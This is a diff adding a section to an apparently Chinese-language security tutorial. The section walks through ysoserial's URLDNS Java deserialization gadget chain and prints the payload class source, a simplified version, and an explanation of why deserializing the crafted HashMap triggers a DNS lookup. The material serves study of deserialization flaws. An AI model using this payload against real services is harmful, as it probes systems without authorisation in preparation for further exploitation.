@@ -138,3 +138,107 @@ public class URLDNS {
 ```
 
 ![image-20220918233654716](images/image-20220918233654716.png)
+
+## ysoserial的实现
+
+`ysoserial`是`java`反序列化利用链的集合工具，可以根据我们需要的利用链生成反序列 POC。项目地址：
+
+```
+https://github.com/frohoff/ysoserial
+```
+
+下载源代码后导入 idea，根据`pom.xml`文件中的引导设置`GeneratePayload.java`文件为`mainClass`
+![image-20220919172929224](images/image-20220919172929224.png)
+
+设置`URLDNS`的运行参数![image-20220919173043221](images/image-20220919173043221.png)
+
+其中`URLDNS`利用链部分的实现源码如下（删除部分不重要的内容）：
+```java
+package ysoserial.payloads;
+
+import java.io.IOException;
+import java.net.InetAddress;
+import java.net.URLConnection;
+import java.net.URLStreamHandler;
+import java.util.HashMap;
+import java.net.URL;
+
+import ysoserial.payloads.annotation.Authors;
+import ysoserial.payloads.annotation.Dependencies;
+import ysoserial.payloads.annotation.PayloadTest;
+import ysoserial.payloads.util.PayloadRunner;
+import ysoserial.payloads.util.Reflections;
+
+
+public class URLDNS implements ObjectPayload<Object> {
+
+        public Object getObject(final String url) throws Exception {
+
+                //Avoid DNS resolution during payload creation
+                //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.
+                URLStreamHandler handler = new SilentURLStreamHandler();
+
+                HashMap ht = new HashMap(); // HashMap that will contain the URL
+                URL u = new URL(null, url, handler); // URL to use as the Key
+                ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.
+
+                Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.
+
+                return ht;
+        }
+
+        public static void main(final String[] args) throws Exception {
+                PayloadRunner.run(URLDNS.class, args);
+        }
+
+        static class SilentURLStreamHandler extends URLStreamHandler {
+
+                protected URLConnection openConnection(URL u) throws IOException {
+                        return null;
+                }
+
+                protected synchronized InetAddress getHostAddress(URL u) {
+                        return null;
+                }
+        }
+}
+```
+
+简化后如下：
+```java
+URLStreamHandler handler = new SilentURLStreamHandler();
+HashMap ht = new HashMap(); 
+URL u = new URL(null, url, handler);
+ht.put(u, url); 
+Reflections.setFieldValue(u, "hashCode", -1); 
+
+static class SilentURLStreamHandler extends URLStreamHandler {
+  protected URLConnection openConnection(URL u) throws IOException {
+    return null;
+  }
+
+  protected synchronized InetAddress getHostAddress(URL u) {
+    return null;
+  }
+}
+```
+
+利用链如下：
+```
+Gadget Chain:
+ *     HashMap.readObject()
+ *       HashMap.putVal()
+ *         HashMap.hash()
+ *           URL.hashCode()
+```
+
+可以看到`ysoserial`直接继承`URLStreamHandler`类重写了`getHostAddress()`方法为空，因此避免了在生成`payload`的时候发起`DNS`请求。
+
+**那为什么反序列化后还能发送`DNS`请求？**
+
+可以看到在`java.net.URL`类中`handler`参数被`transient`关键字修饰
+![image-20220919182207942](images/image-20220919182207942.png)
+
+> 一旦变量被transient修饰，变量将不再是对象持久化的一部分，该变量内容在序列化后无法获得访问（被忽略）
+
+因此在序列化的过程中会忽略掉`handler`，在反序列化时能正常执行`DNS`请求。
